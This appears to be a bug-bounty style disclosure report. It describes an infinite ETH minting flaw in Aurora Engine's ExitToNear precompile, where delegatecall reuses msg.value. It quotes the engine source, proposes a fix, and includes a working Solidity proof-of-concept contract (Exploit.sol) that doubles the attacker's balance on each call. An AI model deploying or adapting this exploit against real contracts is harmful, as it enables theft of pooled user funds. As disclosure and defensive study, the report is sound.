# Infinite ETH Inflation Vulnerability In Aurora Engine

## Brief

In April 2022, I found a devastating double-spent vulnerability in [aurora engine](https://github.com/aurora-is-near/aurora-engine), affecting the deployed [aurora](https://explorer.near.org/accounts/aurora) mainnet. This flaw could have been exploited to mint arbitrary ETH in the aurora evm at an exponential speed, draining the nETH balance of `aurora` account, a pool of more than 70k ETH. Furthermore, considering that the mapped ERC20 tokens can be purchased by the fake ETH, billions(?) TVL in aurora ecosystem could be smashed by this bug.


## Details

Aurora Engine is an EVM environment built on the NEAR protocol. It allows users to deposit ETH and ERC20 tokens from Ethereum mainnet to the nested layer of NEAR. It's a complex system, and I'm not sure I understand every detail of the implementation, so the following explanation might be incorrect. I will only focus on the logic related to the buggy part.

There are some prebuilt contracts in the aurora engine. Two of them are particularly interesting: `ExitToNear` and `ExitToEthereum`. In short, they are special builtin contracts that handle withdraw requests from the Aurora EVM. The example of triggering the special contracts are given in [EvmErc20.sol](https://github.com/aurora-is-near/aurora-engine/blob/master/etc/eth-contracts/contracts/EvmErc20.sol), which is the template contract of mapped ERC20 tokens.

```solidity
    function withdrawToNear(bytes memory recipient, uint256 amount) external override {
        _burn(_msgSender(), amount);

        bytes32 amount_b = bytes32(amount);
        bytes memory input = abi.encodePacked("\x01", amount_b, recipient);
        uint input_size = 1 + 32 + recipient.length;

        assembly {
            let res := call(gas(), 0xe9217bc70b7ed1f598ddd3199e80b093fa71124f, 0, add(input, 32), input_size, 0, 32)
        }
    }

    function withdrawToEthereum(address recipient, uint256 amount) external override {
        _burn(_msgSender(), amount);

        bytes32 amount_b = bytes32(amount);
        bytes20 recipient_b = bytes20(recipient);
        bytes memory input = abi.encodePacked("\x01", amount_b, recipient_b);
        uint input_size = 1 + 32 + 20;

        assembly {
            let res := call(gas(), 0xb0bd02f6a392af548bdf1cfaee5dfa0eefcc8eab, 0, add(input, 32), input_size, 0, 32)
        }
    }
```

The native contract learns the ERC20 being withdrawn from its caller, which is correct and safe, since the contract burns the corresponding token before calling to the contract. However, the hidden(?) functionality of withdrawing ETH by the native contracts seems faulty.


[aurora-engine/engine-precompiles/src/native.rs](https://github.com/aurora-is-near/aurora-engine/blob/5c8691ea6ea5f1b309ef227f7f5c719ffea45d28/engine-precompiles/src/native.rs#L198)

```rust
impl ExitToNear {
    /// Exit to NEAR precompile address
    ///
    /// Address: `0xe9217bc70b7ed1f598ddd3199e80b093fa71124f`
    /// This address is computed as: `&keccak("exitToNear")[12..]`
    pub const ADDRESS: Address =
        super::make_address(0xe9217bc7, 0x0b7ed1f598ddd3199e80b093fa71124f);

    pub fn new(current_account_id: AccountId) -> Self {
        Self { current_account_id }
    }
}

...

impl Precompile for ExitToNear {

...

        let (nep141_address, args, exit_event) = match flag {
            0x0 => {
                // ETH transfer
                //
                // Input slice format:
                //      recipient_account_id (bytes) - the NEAR recipient account which will receive NEP-141 ETH tokens

                if let Ok(dest_account) = AccountId::try_from(input) {
                    (
                        current_account_id,
                        // There is no way to inject json, given the encoding of both arguments
                        // as decimal and valid account id respectively.
                        format!(
                            r#"{{"receiver_id": "{}", "amount": "{}", "memo": null}}"#,
                            dest_account,
                            context.apparent_value.as_u128()
                        ),
                        events::ExitToNear {
                            sender: Address::new(context.caller),
                            erc20_address: events::ETH_ADDRESS,
                            dest: dest_account.to_string(),
                            amount: context.apparent_value,
                        },
                    )
                } else {
                    return Err(ExitError::Other(Cow::from(
                        "ERR_INVALID_RECEIVER_ACCOUNT_ID",
                    )));
                }

...

        let transfer_promise = PromiseCreateArgs {
            target_account_id: nep141_address,
            method: "ft_transfer".to_string(),
            args: args.as_bytes().to_vec(),
            attached_balance: Yocto::new(1),
            attached_gas: costs::FT_TRANSFER_GAS,
        };

        #[cfg(feature = "error_refund")]
        let promise = PromiseArgs::Callback(PromiseWithCallbackArgs {
            base: transfer_promise,
            callback: refund_promise,
        });
        #[cfg(not(feature = "error_refund"))]
        let promise = PromiseArgs::Create(transfer_promise);

        let promise_log = Log {
            address: Self::ADDRESS.raw(),
            topics: Vec::new(),
            data: promise.try_to_vec().unwrap(),
        };
        let exit_event_log = exit_event.encode();
        let exit_event_log = Log {
            address: Self::ADDRESS.raw(),
            topics: exit_event_log.topics,
            data: exit_event_log.data,
        };

        Ok(PrecompileOutput {
            logs: vec![promise_log, exit_event_log],
            ..Default::default()
        }
        .into())
```

If the flag is '\x00', it will trigger the ETH exit path. It generates an event `ExitToNear` recording the `sender`, `dest` and `amount` of this exit. Later, the `exit_event_log` containing the event info is returned. When the main execution is done, these logs along with all the other logs during the execution will be checked by `filter_promises_from_logs` in [aurora-engine/engine/src/engine.rs](https://github.com/aurora-is-near/aurora-engine/blob/5c8691ea6ea5f1b309ef227f7f5c719ffea45d28/engine/src/engine.rs#L1293).

```rust
fn filter_promises_from_logs<T, P>(handler: &mut P, logs: T) -> Vec<ResultLog>
where
    T: IntoIterator<Item = Log>,
    P: PromiseHandler,
{
    logs.into_iter()
        .filter_map(|log| {
            if log.address == ExitToNear::ADDRESS.raw()
                || log.address == ExitToEthereum::ADDRESS.raw()
            {
                if log.topics.is_empty() {
                    if let Ok(promise) = PromiseArgs::try_from_slice(&log.data) {
                        match promise {
                            PromiseArgs::Create(promise) => schedule_promise(handler, &promise),
                            PromiseArgs::Callback(promise) => {
                                let base_id = schedule_promise(handler, &promise.base);
                                schedule_promise_callback(handler, base_id, &promise.callback)
                            }
                        };
                    }
```

As long as the `Log` is generated with hardcoded address `ExitTo(Near|Ethereum)::ADDRESS`, the `log.data` will be processed as new promises to be scheduled.

I have not found any code triggering this ETH withdraw procedure, but my guess of the expected usage is that the user has to transfer his ETH to some contract by `msg.value`, then these ETH get burnt or locked and the native contract builds promises asking the `aurora` to transfer its nETH back to user.

However, those transfer promises can be generated as long as the code of native contracts are invoked. In ethereum, there are a few variants of `call()` method, such as `callcode()`, `delegatecall()` and `staticcall()`. Only `staticcall()` is explicitly prohibited. If we use `delegatecall()` to call the native contract, the `msg.value` will be inherited from the original calling context, but the ETH is no longer passed to the native contract.

[sputnikvm/runtime/src/eval/system.rs](https://github.com/aurora-is-near/sputnikvm/blob/37448b6cacd98b06282cff5a559684505c29bd2b/runtime/src/eval/system.rs#L368)

```rust
    let context = match scheme {
        CallScheme::Call | CallScheme::StaticCall => Context {
            address: to.into(),
            caller: runtime.context.address,
            apparent_value: value,
        },
        CallScheme::CallCode => Context {
            address: runtime.context.address,
            caller: runtime.context.address,
            apparent_value: value,
        },
        CallScheme::DelegateCall => Context {
            address: runtime.context.address,
            caller: runtime.context.caller,
            apparent_value: runtime.context.apparent_value,
        },
    };

    let transfer = if scheme == CallScheme::Call {
        Some(Transfer {
            source: runtime.context.address,
            target: to.into(),
            value,
        })
    } else if scheme == CallScheme::CallCode {
        Some(Transfer {
            source: runtime.context.address,
            target: runtime.context.address,
            value,
        })
    } else {
        None
    };

    match handler.call(
        to.into(),
        transfer,
        input,
        gas,
        scheme == CallScheme::StaticCall,
        context,
    ) {
```

Here is a simple solidity code example that triggers the bug:

```solidity Exploit.sol
// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.7;

contract Exploit {
    address payable private owner;

    constructor() {
        owner = payable(msg.sender);
    }

    function exploit(bytes memory recipient) public payable {
        require(msg.sender == owner);

        bytes memory input = abi.encodePacked("\x00", recipient);
        uint input_size = 1 + recipient.length;

        assembly {
            let res := delegatecall(gas(), 0xe9217bc70b7ed1f598ddd3199e80b093fa71124f, add(input, 32), input_size, 0, 32)
        }

        owner.transfer(msg.value);
    }
}
```

It takes the ETH value from the caller, triggers the exit event in the ExitToNear contract, then sends the nETH back to the caller. The nETH can be deposited into Aurora EVM again, effectively doubling the attacker's original balance. As long as the `aurora` contract has enough budget to transfer, the ETH will be doubled exponentially.


## Fix

For simplicity, `delegatecall()` and `callcode()` should be banned on those native contracts. Or the `address` field of the `Log` entry can be sanitized.

## Attachments

* report.md: this report
* reproduce.md: notes on poc
* Exploit.sol: evm exploit in solidity
* deploy.sh: prepare testing accounts
* exploit.py: demo printing money
* mainnet-test.wasm: test build of release 2.5.2, with `integration-test` feature for `mint_account`
* mint\_account.py & ft\_transfer\_call.py: helper scripts for building command

